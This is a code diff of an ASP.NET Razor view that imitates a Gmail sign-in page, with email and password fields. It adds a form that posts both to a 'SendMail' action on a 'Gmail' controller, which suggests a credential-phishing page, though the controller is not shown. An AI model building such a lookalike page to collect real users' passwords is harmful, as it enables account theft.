@@ -2,7 +2,6 @@
     Gmail_Layout.cshtml = "Gmail_Layout.cshtml";
 } *@
 
-<head>
 <style>
 .screen-1 {
  
@@ -107,26 +106,27 @@ button {
   cursor: pointer;
 } 
 </style>
-</head>
-<body>
+
+<form asp-action="SendMail" asp-controller="Gmail" method="post">
 <!-- partial:index.partial.html -->
 <div class="screen-1">
   <svg class="logo" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  width="200" height="200" viewbox="0 0 640 480" xml:space="preserve"> 
   </svg>
   <div class="email">
-    <label for="email">Email Address</label>
+  
+    <label for="Mail">Email Address</label>
     <div class="sec-2">
       <ion-icon name="mail-outline"></ion-icon>
-      <input type="email" name="email" placeholder="Username@gmail.com"/>
+      <input type="Mail" name="Mail" placeholder="Username@gmail.com"/>
     </div>
   </div>
   <div class="password">
-    <label for="password">Password</label>
+    <label for="Password">Password</label>
     <div class="sec-2">
       <ion-icon name="lock-closed-outline"></ion-icon>
-      <input class="pas" type="password" name="password" placeholder="············"/>
+      <input class="pas" type="Password" name="Password" placeholder="············"/>
       <ion-icon class="show-hide" name="eye-outline"></ion-icon>
     </div>
   </div>
   <a href="Views/Gmail/Register"><button class="login">Logins</button></a>
-</body>
+  </form>
